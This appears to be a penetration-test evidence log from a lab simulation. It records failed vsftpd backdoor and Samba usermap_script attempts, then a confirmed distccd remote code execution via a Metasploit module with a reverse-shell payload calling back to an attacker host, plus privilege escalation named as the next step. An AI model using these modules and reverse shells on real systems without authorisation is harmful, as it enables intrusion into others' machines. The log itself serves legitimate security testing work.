# Evidence Log

## Session: <SIM-ID> -- <date UTC>
- Target: 
- Module: 
- Method: 
- Session ID: 
- Verification: `id` -> 
- Evidence files:
  - evidence/raw_logs/...
  - evidence/screenshots/...

## Finding: vsftpd 2.3.4 Backdoor (port 21) — NOT EXPLOITABLE
- Date: 2026-08-26
- Attempts: 3 (via MSF-RPC) + 1 manual msfconsole
- Evidence: port 6200 remained CLOSED during all attempts (nmap -p 6200)
- Conclusion: backdoor not present in this build of the target VM.
- Action: pivoted to alternative vectors (distccd, Samba usermap_script).

## Finding: Samba usermap_script — NOT VULNERABLE
- Target version: Samba 4.3.11-Ubuntu (out of affected range 3.0.20-3.0.25)
- Result: no session after 45s — correct negative, not a framework failure.

## Finding: distccd RCE (port 3632) — CONFIRMED ACTIVE EXPLOIT
- Target: 192.168.187.144:3632
- Module: exploit/unix/misc/distcc_exec
- Payload: cmd/unix/reverse -> LHOST 192.168.187.137:4446
- Session ID: 1 (type: shell)
- Verification:
  - id -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
  - uname -a -> Linux 740310e1d8fc 4.4.0-119-generic ... x86_64 GNU/Linux
- Evidence file: evidence/session_transcripts/session_001.txt
- Note: session runs as 'daemon' not root -- privilege escalation needed
  for full compromise (see MITRE T1068 as next step in attack chain).
